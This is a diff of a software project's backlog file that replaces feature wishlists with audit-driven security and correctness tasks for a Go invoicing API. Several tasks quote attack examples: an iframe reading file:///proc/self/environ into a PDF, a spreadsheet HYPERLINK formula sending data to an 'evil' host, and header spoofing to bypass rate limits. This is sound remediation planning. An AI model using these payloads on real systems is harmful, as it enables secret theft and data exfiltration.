+**What it does** — New `internal/api/middleware/client_ip.go`: when `X-SP-Edge-Secret` equals `EDGE_PROXY_SECRET`, take `X-SP-Client-IP` as the client IP; always strip both headers before handlers run. Default `router.SetTrustedProxies(nil)` instead of skipping the call when `SERVER_TRUSTED_PROXIES` is empty (`cmd/main.go:189-193`, default empty at `config/config.go:389`, `.env.example:27`). Delete the unwired `RATE_LIMIT_TRUSTED_PROXIES` (`config.go:432`). Config field + both `.env` files per CLAUDE.md.
 
-### Concurrency Control
+**Why we need it** — With the current default Gin trusts every proxy, so `c.ClientIP()` is the left-most `X-Forwarded-For` value the client controls. A random header per request bypasses the 100/min anonymous limit and the 10–20/min limits on public invoice and token endpoints (`ratelimit_api.go:196,211`, `ratelimit_invoice.go:48`, `ratelimit.go:34`), enabling token and invoice-number brute force. Behind the Worker, every request otherwise appears to come from Cloudflare egress IPs.
 
-- [ ] **Semaphore-Based Rate Limiting** - Prevent resource exhaustion
-  - Configurable max concurrent uploads/downloads
-  - Context-aware semaphore acquisition
-  - **Benefit**: Prevents overwhelming the storage provider or local resources
-
-### Content Validation
-
-- [ ] **Checksum Verification** - Data integrity assurance
-  - SHA256 checksum calculation on upload
-  - Checksum stored in metadata for verification on download
-  - MD5 content integrity headers
-  - **Benefit**: Detect corruption during transfer
-
-### MIME Type Detection
-
-- [ ] **Automatic Content Type Detection** - Proper file handling
-  - Extension-based detection
-  - Content sniffing for unknown extensions
-  - Configurable allowed/blocked MIME types
-  - **Benefit**: Correct content-type headers, security filtering
-
-### File Organization
-
-- [ ] **Key Generation Strategy** - Organized storage structure
-  - Pattern: `{document_type}/{year}/{month}/{uuid}_{filename}`
-  - Filename sanitization
-  - Entity association metadata
-  - **Benefit**: Easy browsing, logical organization, deduplication
-
-### Encryption Support
-
-- [ ] **Server-Side Encryption Options** - Data at rest security
-  - AES-256 encryption
-  - KMS key support
-  - Per-upload encryption override
-  - **Benefit**: Compliance, data protection
-
-### Batch Operations
-
-- [ ] **Bulk Delete** - Efficient multi-object operations
-  - Delete multiple objects in single API call
-  - Quiet mode (suppress individual responses)
-  - **Benefit**: Faster cleanup operations
-
-### Object Versioning
-
-- [ ] **Version Management** - Object history
-  - Delete specific versions
-  - Download specific versions
-  - Version ID tracking
-  - **Benefit**: Accidental deletion recovery, audit trail
-
-### Client Statistics
-
-- [ ] **Upload/Download Metrics** - Operational visibility
-  - Total uploads/downloads count
-  - Total bytes transferred
-  - Failed operation tracking
-  - **Benefit**: Usage monitoring, capacity planning
+**Notes** — security audit F-7; infra audit §3 "Client IP behind edge". The Worker side already sends these headers (`frontend/worker/proxy.ts`, landed in 6b63cef) — confirm the header names match. 23 call sites use `c.ClientIP()`.
 
 ---
 
-## Metrics Client Enhancements
+#### T108 — Escape PDF export HTML; drop wkhtmltopdf local file access
 
-The following advanced metrics features were identified in legacy code and should be integrated into the unified metrics client factory (`pkg/clients/metrics/`).
+**Phase**: 1 · **Category**: Security · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-### Histogram Implementation
+**What it is** — Export PDFs are generated by the existing gofpdf engine instead of wkhtmltopdf, so user text can never become HTML that reads local files or fetches internal URLs.
 
-- [ ] **Distribution Tracking** - Latency and size distributions
-  - Configurable bucket boundaries
-  - Percentile calculations (p50, p90, p99)
-  - Count and sum tracking
-  - **Benefit**: Understanding latency distributions, SLO monitoring
+**What it does** — Move PDF exports in `unified_export_service.go:761-784` to `internal/services/pdf` (gofpdf, already used by `DocumentPDFService`). Delete the wkhtmltopdf path in `pdf_service.go` (`:50-53,286`, the `--enable-local-file-access` flag at `:367`) and the unused `ProcessImage` that does `http.Get(arbitraryURL)` (`pdf_service.go:409`). If any HTML path survives, build it with `html/template`.
 
-### Summary Implementation
+**Why we need it** — `opts.HeaderText` from the request body is written raw into HTML (`unified_export_service.go:817`) and customer/job fields go into `<td>` via `Sprintf` unescaped (`:848`). With local file access on, `<iframe src='file:///proc/self/environ'>` renders `JWT_SECRET`, `STRIPE_SECRET_KEY` and `DATABASE_URL` into a downloadable PDF. Today it only fails because the runtime image lacks wkhtmltopdf — every PDF export currently errors.
 
-- [ ] **Sliding Window Statistics** - Recent trend analysis
-  - Configurable window size
-  - Mean calculation over window
-  - Memory-efficient ring buffer
-  - **Benefit**: Real-time trend monitoring
-
-### Runtime Metrics Collection
-
-- [ ] **Go Runtime Metrics** - Application health
-  - Goroutine count
-  - Heap allocation and objects
-  - GC pause times and cycles
-  - CPU count
-  - Configurable collection interval
-  - **Benefit**: Memory leak detection, performance profiling
-
-### Metrics Registry
-
-- [ ] **Centralized Metric Management** - Organized metrics
-  - Get-or-create pattern for metrics
-  - Label-based metric identification
-  - Export all metrics as array
-  - **Benefit**: Prevents duplicate metrics, easy enumeration
+**Notes** — security audit F-8, F-25; correctness audit 1.3 and 5.3 (one PDF engine).
 
 ---
 
-## Future Features
+#### T109 — Stripe webhook reliability: persistent dedupe, accept retries, body limit, idempotent payment
 
-### Near-term Features
+**Phase**: 1 · **Category**: Security · **Hours**: 5 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-- [ ] **Webhook Handling Improvements**
-  - Stripe event retry logic
-  - Webhook signature verification
-  - Event deduplication
-  - Webhook delivery status tracking
+**What it is** — The Stripe webhook processes each event exactly once across instances and restarts, accepts Stripe's retries, and records a payment against an invoice at most once.
 
-- [x] **Invoice PDF Generation**
-  - Template-based PDF generation
-  - Email attachment support
-  - _Note: Multiple languages and custom branding not yet implemented_
+**What it does** — Replace the in-memory dedupe map (`services/stripe/webhook.go:34,106-127`, non-atomic check-then-mark) with a `stripe_events (id PRIMARY KEY, type, received_at)` table written with `INSERT … ON CONFLICT DO NOTHING` inside the processing transaction. Delete the 5-minute `event.Created` age check (`:238`) — signature timestamp checking in `ConstructEvent` already covers replay. Wrap the body in `http.MaxBytesReader(…, 64<<10)` (`:144`). Make `MarkInvoiceAsPaid` (`invoice_service.go:672-698`) idempotent: unique index on the Checkout session / PaymentIntent ID, `SELECT … FOR UPDATE` on the invoice, and write an `invoice_payments` row (shared with T118).
 
-- [ ] **Email Templates Expansion**
-  - Job completion notification
-  - Quote expiration reminder
-  - Payment received confirmation
-  - Account activity summary
+**Why we need it** — Stripe retries keep the original `Created`, so every retry after 5 minutes is rejected with 400 — one failed first delivery means a payment is never recorded. A duplicate delivery to two instances double-credits a partially paid invoice. The endpoint is unauthenticated and reads an unbounded body.
 
-- [ ] **Dashboard KPI Improvements**
-  - Real-time metrics updates
-  - Customizable date ranges
-  - Export to CSV/PDF
-  - Comparative analysis (vs last period)
-
-### Medium-term Features
-
-- [ ] **API Rate Limiting per User/Tenant**
-  - Tier-based rate limits
-  - Burst allowance
-  - Rate limit headers in responses
-  - Admin override capability
-
-- [ ] **Audit Logging**
-  - Track all data modifications
-  - Who, what, when, from where
-  - Audit log search and export
-  - Retention policy
-
-- [ ] **Two-Factor Authentication**
-  - TOTP (Google Authenticator)
-  - SMS backup codes
-  - Recovery codes
-  - Per-user enforcement
-
-- [ ] **Notification Preferences**
-  - Email notification settings
-  - In-app notification settings
-  - Frequency controls (immediate, daily digest, weekly)
-  - Channel preferences per notification type
-
-### Long-term Features
-
-- [ ] **Public API for Integrations**
-  - API key management
-  - Rate limiting per key
-  - Webhook subscriptions
-  - OAuth2 support
-
-- [ ] **Webhooks for Customers**
-  - Event subscriptions
-  - Retry with exponential backoff
-  - Webhook logs
-  - Testing tools
-
-- [ ] **White-label / Custom Branding**
-  - Custom logo and colors
-  - Custom domain support
-  - Email template customization
-  - Pro tier feature
-
-- [ ] **Mobile App / PWA**
-  - Job status updates
-  - Customer information access
-  - Push notifications
-  - Offline support
+**Notes** — security audit F-10; correctness audit 7.H4. Folds in the old "Webhook Handling Improvements" item (retry, dedupe, delivery tracking). The panicking legacy endpoint is T122.
 
 ---
 
-## Orphaned Features to Integrate
+#### T110 — Token hardening: access vs refresh type, revoke on logout and password reset
 
-These features exist in the codebase but are not wired into the application routes. They represent completed or near-complete implementations that should be integrated.
+**Phase**: 1 · **Category**: Security · **Hours**: 4 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-### Job Status State Machine (High Priority) - MOSTLY COMPLETE
+**What it is** — Refresh tokens are no longer accepted as access tokens, and logout-all or a password reset invalidates every outstanding token.
 
-A robust job status management system with state machine validation, concurrency protection, and audit trail.
+**What it does** — `RequireAuth` (`middleware/permissions.go:85-110`) rejects `claims.Type != access` (today only `auth_service.go:127` checks type, and only for refresh). Add `users.token_version`, embed it in both token types, check it on auth and refresh, and bump it in password reset (`password_reset_service.go:141`) and a new logout-all (`auth_handler.go:188` Logout only clears cookies). Optional: store refresh `jti` in Redis and rotate single-use — only after the frontend has a single-flight refresh (T130).
 
-**What it provides:**
+**Why we need it** — A stolen 7-day refresh token works as a bearer token on every route, and after a password reset an attacker's tokens stay valid and can be re-minted through `/auth/refresh` indefinitely.
 
-- State machine pattern with validated transitions (prevents invalid status changes)
-- Pessimistic locking (`SELECT ... FOR UPDATE`) for concurrent update protection
-- Complete status change history with audit trail
-- Bulk status changes for batch operations
-- Automatic timestamp updates (ActualStartAt, ActualEndAt, ActualDuration)
-- Notification dispatch on status changes
-- Transition metrics for monitoring
-
-**API Endpoints (implemented):**
-
-- [x] `POST /api/v1/jobs/:id/transition` - Change job status
-- [x] `GET /api/v1/jobs/:id/status-history` - Get status change history
-- [ ] `GET /api/v1/jobs/:id/status/transitions` - Get allowed transitions
-- [ ] `POST /api/v1/jobs/:id/status/validate` - Validate without applying
-- [ ] `POST /api/v1/jobs/status/bulk` - Bulk status change
-- [ ] `GET /api/v1/jobs/status/statistics` - Status statistics
-
-**Files implemented:**
-
-- `internal/models/job_status.go` - JobStatusTransition model
-- `internal/services/job_service.go` - Status transition logic
-- `internal/api/handlers/job_handler.go` - TransitionStatus and GetStatusHistory handlers
-
-**Remaining integration requirements:**
-
-- [ ] Connect to existing notification service for status change alerts
-- [ ] Add allowed transitions endpoint
-- [ ] Add bulk status change endpoint
+**Notes** — security audit F-11. Keep this minimal: Supabase Auth (T158) replaces the in-house JWTs, but it is ~40h away and the preview needs this now.
 
 ---
 
-### Payment Notification System (High Priority)
+#### T111 — Login hardening: no lockout DoS, uniform errors and timing
 
-Comprehensive payment reminder and notification system with multi-channel delivery.
+**Phase**: 1 · **Category**: Security · **Hours**: 3 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-**What it provides:**
+**What it is** — Login responds identically (status, body and timing) for unknown emails, wrong passwords, locked and unverified accounts, and an attacker can't lock a known user out.
 
-- Multi-channel notifications: Email, SMS, Push, In-App, Webhook
-- Notification types:
-  - `payment_due_soon` - Reminder before due date
-  - `payment_overdue` - Past due notification
-  - `payment_in_grace_period` - Grace period warning
-  - `early_payment_discount_available` - Discount reminder
-  - `late_fee_applied` - Late fee notification
-  - `payment_received` - Confirmation
-  - `partial_payment_received` - Partial payment confirmation
-- Configurable notification rules (e.g., "send reminder 3 days before due")
-- Delivery history tracking (sent, delivered, opened, clicked)
-- Batch processing with configurable retries
-- Scheduled notifications
-- Statistics and metrics
+**What it does** — In `auth_service.go:41-58` always run bcrypt (dummy hash for unknown users) before any status checks; move the locked/unverified 403s (`auth_handler.go:74-86`) after the password check, and return one generic 401 on failure. Replace the 5-failure / 30-minute hard lock keyed on the account (`:96-114`) with exponential backoff keyed on (account, IP), or Cloudflare Turnstile after N failures. The login rate limiter (`middleware/ratelimit.go:30-76`) is keyed on email only and fails open if Redis errors — key on (email, IP) and fail closed for login.
 
-**Database tables needed:**
+**Why we need it** — Today 5 requests every 30 minutes lock any known user out indefinitely, and the early return for unknown emails is a timing oracle for which emails have accounts.
 
-- `payment_notifications` - Notification records
-- `payment_notification_rules` - Rule configurations
-- `payment_notification_history` - Delivery tracking
-
-**Files that were removed (rebuild from this spec):**
-
-- `internal/services/payment_notification_service.go` - Full service implementation
-
-**Integration requirements:**
-
-- [ ] Create database migration for notification tables
-- [ ] Create NotificationProcessor worker (background job)
-- [ ] Wire up to invoice service (trigger on invoice creation/update)
-- [ ] Add SMS provider integration (Twilio or similar)
-- [ ] Create admin UI for managing notification rules
+**Notes** — security audit F-12, F-22 (login limiter). AddMember enumeration is fixed in T103. Retires with T158.
 
 ---
 
-### Job Scheduling System (Medium Priority)
+#### T112 — Neutralise CSV/Excel formula injection in exports
 
-Calendar-style job scheduling with conflict detection and technician availability.
+**Phase**: 1 · **Category**: Security · **Hours**: 1 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-**What it provides:**
+**What it is** — CSV exports never emit a cell that a spreadsheet will execute as a formula.
 
-- Job scheduling with start/end times
-- Conflict detection (overlapping schedules)
-- Technician schedule management
-- Recurrence support (daily, weekly, monthly)
-- Reminders with configurable lead time
-- Color coding for calendar display
+**What it does** — In the `write*CSV` functions (`unified_export_service.go:419-560`) and `pkg/csv/exporter.go:22-90`, prefix any value starting with `=`, `+`, `-`, `@`, tab or CR with `'`. Add a unit test. XLSX via excelize `SetCellValue` with strings is unaffected.
 
-**API Endpoints to wire up:**
+**Why we need it** — A customer named `=HYPERLINK("http://evil/?"&A2,"x")` (or a DDE payload) runs when an office user opens the export in Excel or Sheets.
 
-- `POST /api/v1/schedules` - Create schedule
-- `GET /api/v1/schedules/:id` - Get schedule
-- `PUT /api/v1/schedules/:id` - Update schedule
-- `DELETE /api/v1/schedules/:id` - Delete schedule
-- `GET /api/v1/schedules` - List with filters
-- `GET /api/v1/schedules/technician/:tech_id` - Technician's schedule
-
-**Files that were removed (rebuild from this spec):**
-
-- `internal/services/schedule_service.go` - ScheduleService
-- `internal/api/handlers/schedule_handler.go` - HTTP handlers
-
-**Integration requirements:**
-
-- [ ] Create Schedule model and migration
-- [ ] Create ScheduleRepository
-- [ ] Wire ScheduleHandler into routes.go
-- [ ] Add conflict detection algorithm
-- [ ] Integrate with job creation flow (auto-create schedule)
-- [ ] Add calendar view to frontend
+**Notes** — security audit F-13.
 
 ---
 
-### Tax Calculation Service (Medium Priority)
+#### T113 — Fail closed when no email or storage provider in production; never log tokens
 
-State-based tax calculation with Redis caching for performance.
+**Phase**: 1 · **Category**: Security · **Hours**: 1 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-**What it provides:**
+**What it is** — In production the API refuses to start if email or storage would silently fall back to the mock or to an unconfigured SES, and no log line ever contains a reset, verification or invitation URL.
 
-- State-based tax rate lookups (all US states configured)
-- Zip code to state mapping
-- Tax exemption validation:
-  - Government entities
-  - Educational institutions
-  - Non-profit organizations
-  - Resale certificates
-- Redis caching with 1-hour TTL
-- Configurable default tax rates per state
+**What it does** — Require an explicit `EMAIL_PROVIDER` (env + `config.go` + both `.env` files); `pkg/clients/email/factory.go:91-92` returns an error instead of `ProviderMock` when `ENV=production`. Remove the SES defaults (`AWS_REGION=us-east-1` at `config.go:436`, `AWS_SES_FROM_EMAIL` at `:440`) that make the app silently pick SES when `RESEND_API_KEY` is missing. Same for storage: `storage/factory.go:73-78` must error instead of returning in-memory mock storage in production. Redact token-bearing URLs in `email/mock/mock.go:102,121,131,152,155`.
 
-**Files that were removed (rebuild from this spec):**
+**Why we need it** — If email env is missing on Cloud Run, users never get email and anyone with log access (Cloud Logging, Sentry breadcrumbs) can take over accounts from the logged links. With missing storage keys, PDFs and avatars "upload" into RAM and vanish.
 
-- `internal/services/tax_service.go` - TaxService
-- `internal/services/tax_types.go` - Tax-related types
-
-**Integration requirements:**
-
-- [ ] Wire into invoice creation flow
-- [ ] Wire into quote calculation
-- [ ] Add tax exemption fields to Customer model
-- [ ] Create tax rate admin UI (override defaults)
-- [ ] Add tax breakdown to invoice/quote responses
+**Notes** — security audit F-14; correctness audit §2 "Email provider trap" and "Storage trap". Remaining PII-in-logs work (F-24) is in T116.
 
 ---
 
-### Quote Template System (Medium Priority)
+#### T114 — Lock down /health detail, /metrics, Swagger and debug mode in production
 
-Dynamic quote templating with variable substitution and validation.
+**Phase**: 1 · **Category**: Security · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-**What it provides:**
+**What it is** — Public endpoints expose only liveness/readiness; metrics, the API map and Gin debug output are off or authenticated in any deployed environment.
 
-- Variable substitution: `{{customer_name}}`, `{{quote_total}}`, etc.
-- Type-aware formatting:
-  - Dates → "January 2, 2006"
-  - Decimals → proper precision
-  - Booleans → "Yes/No"
-- Variable validation:
-  - Required/optional variables
-  - Min/max length for text
-  - Regex pattern matching
-  - Allowed values (dropdown)
-  - Min/max for numbers
-- Template categories (HVAC, Plumbing, Electrical, etc.)
-- Template versioning (tracks changes)
-- Usage tracking (counts template usage)
-- Import/export templates as JSON
-- Duplicate template feature
-- Statistics (most used, recently updated)
+**What it does** — `/health` (`routes/routes.go:84`) returns the full dependency report with error strings and memory — restrict public access to `/health/live` and `/health/ready` (status only). `/metrics` (`routes.go:134`, includes platform KPIs from `pkg/database/kpi_metrics.go`: tenants, users, revenue, A/R) moves behind a bearer token or a separate port. Swagger UI (`routes.go:94-105`) and Gin debug mode (`cmd/main.go:109`) are gated on explicit `SWAGGER_ENABLED` / `GIN_MODE`, not on `ENV != "production"`, so a deploy with `ENV=preview` doesn't expose them.
 
-**Template sections:**
+**Why we need it** — A preview deployed with `ENV=preview` or `staging` currently serves the full API map and debug output, and `/metrics` publishes platform revenue and A/R figures.
 
-- Content (main body)
-- Line items (with variable descriptions)
-- Payment terms
-- Delivery info
-- Warranty info
-- Default tax rate
-- Valid days
-
-**Files that were removed (rebuild from this spec):**
-
-- `internal/services/template_engine.go` - Core rendering engine
-- `internal/services/quote_template_service.go` - Business logic
-
-**Integration requirements:**
-
-- [ ] Create QuoteTemplate model and migration
-- [ ] Create TemplateCategory model and migration
-- [ ] Create QuoteTemplateHandler
-- [ ] Wire into routes.go
-- [ ] Integrate with quote creation (create from template)
-- [ ] Add template management UI
+**Notes** — security audit F-15. `ENV=production` on Cloud Run is checked in T212. Published API docs for integrators are T098.
 
 ---
 
-### WebSocket Real-time Notifications (Low Priority)
+#### T115 — Secure cookies by default and CSRF protection
 
-Real-time push notifications via WebSocket for instant updates.
+**Phase**: 1 · **Category**: Security · **Hours**: 3 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-**What it provides:**
+**What it is** — Auth cookies are `Secure` and `SameSite=Strict` outside local development, and state-changing requests can't be forged from a sibling `*.sharkfins.xyz` site.
 
-- WebSocket hub pattern for connection management
-- Real-time status updates (quote status, job status)
-- Broadcast to all connected clients
-- Per-user message targeting
+**What it does** — Default `COOKIE_SECURE=true` unless `ENV=development` (`config/config.go:418`) and `COOKIE_SAMESITE=Strict`. Reject mutating requests whose `Content-Type` isn't `application/json` (Gin's `ShouldBindJSON` ignores Content-Type, so a `text/plain` form POST carrying JSON is accepted today), and require a custom header (`X-Requested-With: servicepro`) on POST/PUT/PATCH/DELETE; set it in the axios instance (`frontend/src/services/api.ts`). Exempt the Stripe/Resend webhooks.
 
-**Files that were removed (rebuild from this spec):**
+**Why we need it** — Auth is cookie-first (`middleware/permissions.go:52`) with SameSite=Lax and no CSRF token. Lax doesn't protect against same-site origins, and every `*.sharkfins.xyz` subdomain (blog, fleet, …) is same-site, so any XSS or subdomain takeover on a sibling site could act on the API.
 
-- `internal/services/websocket_notification_service.go` - WebSocket hub
-
-**Integration requirements:**
-
-- [ ] Set up WebSocket endpoint (`/ws`)
-- [ ] Add authentication for WebSocket connections
-- [ ] Integrate with status change events
-- [ ] Add frontend WebSocket client
-- [ ] Handle reconnection logic
+**Notes** — security audit F-16. Becomes mostly moot when T158 switches the API to bearer tokens, but that's later than the preview.
 
 ---
 
-## Removed Features to Restore
+#### T116 — Low-severity security sweep
 
-These features were removed during build fixes due to missing dependencies or method mismatches. They need to be restored.
+**Phase**: 1 · **Category**: Security · **Hours**: 3 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-### Payment System (High Priority)
+**What it is** — One pass over the audit's low/informational findings so none of them ship to the preview.
 
-Stripe payment integration was removed due to model/service mismatches.
+**What it does** — (1) F-17: stop returning `err.Error()` to clients at the ~160 handler sites (e.g. `assignment_handler.go:377,423,475,541`, `ar_aging_handler.go:75`, `permissions.go:89` JWT parse error) — log server-side, return a generic message (envelope from T223). (2) F-18: delete the unsigned SES/SNS webhook routes (`auth_routes.go:29-30`, `email_verification_handler.go:137-235`); Resend webhooks replace them in T159. (3) F-19: `image.DecodeConfig` before `image.Decode` in `profile_picture_service.go:72`, reject over ~4000×4000. (4) F-21: delete the `/public/invoices/:invoice_number` route (`invoices_routes.go:83`). (5) F-22: the global limiter reads context key `"userID"` but auth sets `"user_id"` and runs after it (`ratelimit_api.go:161,187`) — fix the key and order so signed-in users get per-user limits. (6) F-23: `MaxBytesReader` + row cap on import (`import_export_handler.go:64-95`). (7) F-24: stop logging emails (`password_reset_service.go:72` and others) and don't log interpolated SQL in the slow-query logger (`pkg/database/logger.go:155-168`). (8) F-25: delete the unrouted `download_handler.go` and unwired `AccessControlMiddleware` (overlaps T129).
 
-**Files to restore:**
+**Why we need it** — Each is small, but together they leak internals, allow an OOM via a crafted PNG, leave a one-character-fix away from an unauthenticated invoice lookup, and throttle real users behind one NAT.
 
-- [ ] `backend/internal/models/payment_method.go` - Saved payment methods model (cards, bank accounts)
-- [ ] `backend/internal/services/stripe/payment_methods.go` - Stripe payment methods service
-- [ ] `backend/internal/api/handlers/payment_handler.go` - Payment processing endpoints
-- [ ] `backend/internal/api/handlers/payment_methods.go` - Saved payment methods endpoints
-- [ ] `backend/internal/api/routes/payment_routes.go` - Payment route definitions
-
-**Issues to fix:**
-
-- `PaymentMethodType` and `PaymentMethodResponse` duplicated in `payment.go` and `payment_method.go` - consolidate
-- `User` model needs `StripeCustomerID` field
-- Method signature mismatches between handler and service
-- `PaymentIntentResult` missing `ReceiptURL` field
-
-### Invoice Templates / PDF Generation (Partially Complete)
-
-PDF generation for invoices, quotes, and receipts is now working via `document_pdf_service.go`. Template CRUD management UI is not yet implemented.
-
-**Completed:**
-
-- [x] PDF generation for quotes, invoices, receipts (`backend/internal/services/document_pdf_service.go`)
-- [x] PDF download endpoints (`GET /api/v1/quotes/:id/pdf`, `/invoices/:id/pdf`, `/invoices/:id/receipt/pdf`)
-- [x] PDF attachments in emails
-- [x] PDF templates (`backend/internal/services/pdf/templates.go`)
-
-**Remaining (template management UI):**
-
-- [ ] `backend/internal/api/handlers/invoice_template_handler.go` - Template CRUD
-- [ ] `backend/internal/api/routes/invoice_template_routes.go` - Template route definitions
-- [ ] Frontend template management UI
-
-### Error Tracking - Sentry (Medium Priority)
-
-Sentry integration for production error monitoring.
-
-**Files to restore:**
-
-- [ ] `backend/internal/api/middleware/error_tracking.go` - Sentry middleware
-- [ ] `backend/internal/api/middleware/error_tracking_test.go` - Tests
-
-**Dependencies:** `go get github.com/getsentry/sentry-go`
-
-**Environment variables:** `SENTRY_DSN`, `SENTRY_ENVIRONMENT`
-
-### Health Checks - Advanced (Medium Priority)
-
-Advanced health check system with uptime tracking and dashboard.
-
-**Files to restore:**
-
-- [ ] `backend/internal/health/` - Health check package (needs to be created)
-- [ ] `backend/internal/api/handlers/health_handler.go` - Health endpoints
-- [ ] `backend/internal/api/routes/health_routes.go` - Health route definitions
-
-**Features:** Detailed health per dependency, uptime tracking, health dashboard, k8s probes
-
-### Analytics System (Low Priority)
-
-Custom analytics for tracking API usage and feature adoption.
-
-**Files to restore:**
-
-- [ ] `backend/internal/analytics/` - Analytics package (needs to be created)
-- [ ] `backend/internal/api/middleware/analytics.go` - Analytics middleware
-- [ ] `backend/internal/api/handlers/analytics_handler.go` - Analytics API endpoints
-
-### Performance Monitoring (Low Priority)
-
-Request performance, database query, and cache metrics.
-
-**Files to restore:**
-
-- [ ] `backend/internal/monitoring/` - Monitoring package (needs to be created)
-- [ ] `backend/internal/api/middleware/performance.go` - Performance middleware
-- [ ] `backend/internal/api/handlers/metrics_handler.go` - Metrics endpoints
-- [ ] `backend/internal/api/handlers/metrics_handler_test.go` - Tests
-- [ ] `backend/internal/api/routes/metrics_routes.go` - Metrics route definitions
-
-**Features:** Request duration histograms, error rate tracking, slow request detection, Prometheus `/metrics` endpoint
-
-### Other Fixes Needed
-
-- [ ] `backend/internal/services/quote_status_machine.go:118` - Customer email validation commented out; need to add `CustomerEmail` to Quote model or load Customer relationship
+**Notes** — security audit F-17 to F-25. Folds in the old "API Rate Limiting per User/Tenant" item (per-user limits) at the minimum level the preview needs.
 
 ---
 
-## Completed Items
+#### T117 — Remediate dependency vulnerabilities and bump the Go toolchain
 
-_Move items here when completed with date and PR/commit reference_
+**Phase**: 1 · **Category**: Security · **Hours**: 3 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-- [x] Initial project setup (2024-01-15)
-- [x] Basic authentication flow (2024-01-20)
-- [x] Customer CRUD operations (2024-01-25)
-- [x] Membership system with Stripe integration (2025-01-25)
-- [x] Subscription proration preview (2025-01-25)
-- [x] Local email development setup with Mailpit (2025-01-25)
-- [x] Security headers middleware (2025-01-25)
-- [x] CORS configuration with environment-specific origins (2025-01-25)
-- [x] Job status state machine with transition validation (2025-01-29)
-- [x] Job status history tracking (2025-01-29)
-- [x] PDF generation for quotes, invoices, and receipts (2025-01-30)
-- [x] PDF attachments in quote/invoice/receipt emails (2025-01-30)
-- [x] PDF download endpoints for quotes, invoices, receipts (2025-01-30)
-- [x] Clone quote functionality (2025-01-30)
-- [x] Quote accept/decline actions in UI (2025-01-30)
-- [x] Dropdown menus with portal rendering (fixes table overflow clipping) (2025-01-30)
-- [x] Cypress E2E testing setup with tests for auth, customers, jobs, invoices, quotes, payments
+**What it is** — govulncheck reports zero reachable vulnerabilities and `npm audit --omit=dev` reports no high or critical issues; Go and Node versions are the same everywhere.
+
+**What it does** — Go: toolchain to 1.27.2+ (12 stdlib vulns); `golang.org/x/net` ≥ v0.60.0, `x/text` ≥ v0.41.0, `jackc/pgx/v5` ≥ v5.9.2 (GO-2026-5004, SQL injection via placeholder confusion with dollar-quoted literals), `excelize/v2` v2.11.0, `grpc` v1.83.1, `otel*` v1.45.0 (or delete OTel in T126), aws-sdk-go-v2 s3 v1.97.3 / eventstream v1.7.8, `quic-go` v0.59.1; move `posthog-go` from indirect to direct. Align the `go` directive, `Makefile GO_VERSION` (1.21), `checks.yml` (1.21) and the Dockerfile (1.24, rewritten in T143). Frontend: `npm audit fix`, axios ≥ 1.20 (direct dependency; 1.13.4 is in the affected range), protobufjs (critical, via posthog-js → OpenTelemetry), form-data via axios.
+
+**Why we need it** — 25 reachable Go vulnerabilities, including a pgx SQL-injection advisory, and a critical npm advisory are not acceptable on an internet-facing preview.
+
+**Notes** — security audit F-20 (full output was `govuln.txt` next to the audit); frontend audit §2.8; infra audit §2 "Go version drift". Ongoing scanning is T147.
 
 ---
 
-## Notes
+### Phase 2 — Correctness & Cleanup (T118, T119, T120, T121, T122, T123, T124, T125, T126, T127, T128, T129, T130, T131, T132, T133, T134, T135, T136, T137, T138, T223, T224, T225, T226)
 
-### Priority Definitions
+Money flows that are wired but broken (payments don't update invoices, reminders never sent, numbering wedges, a panicking webhook), frontend bugs users would hit in the preview, and dead code. From `docs/audits/2026-10-16/backend-correctness.md` and `docs/audits/2026-10-16/frontend.md`. **25 open tasks, ~69h.**
 
-- **P0 (Critical)**: Blocks production deployment or poses security risk
-- **P1 (High)**: Required for 1.0 release; significant user impact
-- **P2 (Medium)**: Improves developer experience or code quality
-- **P3 (Low)**: Nice-to-have improvements
+- [ ] T118 — Recording a payment updates the invoice balance and status
+- [ ] T119 — Stripe Checkout charges the true balance due
+- [ ] T120 — Invoice and job numbering survives soft-delete and concurrency
+- [ ] T121 — Payment reminders actually send
+- [ ] T122 — Fix /webhooks/stripe panicking on subscription and invoice events
+- [ ] T123 — Add the missing SQL functions and views behind customer search and reports
+- [ ] T124 — Enforce invoice status transitions; unify the two job state machines
+- [ ] T125 — Handle refunds in the ledger
+- [ ] T126 — Backend Sentry actually initialised; wire or delete the Loki/BetterStack/OTel stubs
+- [ ] T127 — Backend reads tenant settings: currency, number prefixes, defaults
+- [ ] T128 — Exports safe on multiple instances (object storage + persisted progress)
+- [ ] T129 — Backend dead-code removal and a stricter linter
+- [ ] T130 — Login error swallowed by the refresh interceptor
+- [ ] T131 — Public payment result pages for the /pay/:token flow
+- [ ] T132 — Clear tenant and user data on logout and tenant switch
+- [ ] T133 — Job times entered and shown in the tenant's timezone, stored as true UTC
+- [ ] T134 — Strip sensitive query params from analytics and error breadcrumbs
+- [ ] T135 — Frontend medium-severity sweep
+- [ ] T136 — Green frontend test suite and lint
+- [ ] T137 — Frontend dead-code removal (~18.5k unreachable lines)
+- [ ] T138 — Preview polish: honest contact form, legal pages marked draft, favicon
+- [ ] T223 — Request IDs and a standard API error envelope
+- [ ] T224 — Quote correctness: lost customer edits, accept race, expiry, editable sent quotes
+- [ ] T225 — Invoice totals: one server-side recalculation, tax/discount order, no double invoicing
+- [ ] T226 — Tenant creation and invitation acceptance in transactions; per-tenant uniqueness
 
-### Adding New Items
+#### T118 — Recording a payment updates the invoice balance and status
 
-When adding new items, include:
+**Phase**: 2 · **Category**: Bug · **Hours**: 3 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-1. **What**: Clear description of what needs to be done
-2. **Why**: Why it's important / what problem it solves
-3. **Expected Result**: What success looks like
-4. **Acceptance Criteria**: Specific, testable requirements
+**What it is** — Recording a payment (manual or Stripe) increments `amount_paid`, moves the invoice to `partially_paid` or `paid`, and sets `paid_date`, atomically.
 
-### Sprint Planning
